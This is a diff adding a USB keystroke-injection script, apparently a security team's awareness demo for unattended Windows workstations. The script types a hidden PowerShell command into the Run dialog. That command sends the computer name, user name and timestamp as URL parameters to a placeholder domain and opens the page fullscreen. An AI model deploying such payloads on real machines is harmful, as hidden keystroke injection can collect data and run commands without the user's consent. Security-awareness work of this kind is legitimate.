@@ -1,0 +1,40 @@
+# Unattended Workstation Security Awareness Demo
+# Target: Windows
+# Author: Security Team
+#
+# This payload opens a browser to the security awareness page
+# with the target's hostname and username as URL parameters.
+
+# Set attack mode to HID (keyboard emulation)
+ATTACKMODE HID
+
+# LED indicator - setup phase
+LED SETUP
+
+# Initial delay to let the device enumerate
+DELAY 1000
+
+# LED indicator - attack phase
+LED ATTACK
+
+# Open Run dialog
+GUI r
+DELAY 500
+
+# Execute PowerShell command to launch browser with system info. REMEMBER TO ADD CUSTOM DOMAIN.
+# The command:
+# 1. Captures hostname and username
+# 2. URL-encodes them
+# 3. Gets current timestamp
+# 4. Launches default browser with parameters
+STRING powershell -WindowStyle Hidden -Command "$h=[System.Net.WebUtility]::UrlEncode($env:COMPUTERNAME);$u=[System.Net.WebUtility]::UrlEncode($env:USERNAME);$t=[System.Net.WebUtility]::UrlEncode((Get-Date -Format 'dd/MM/yyyy HH:mm:ss'));Start-Process \"https://DOMAINNAME?hostname=$h&username=$u&timestamp=$t\""
+ENTER
+
+# Wait for browser to launch and page to load
+DELAY 2500
+
+# Send F11 to enter fullscreen mode
+F11
+
+# LED indicator - finished
+LED FINISH
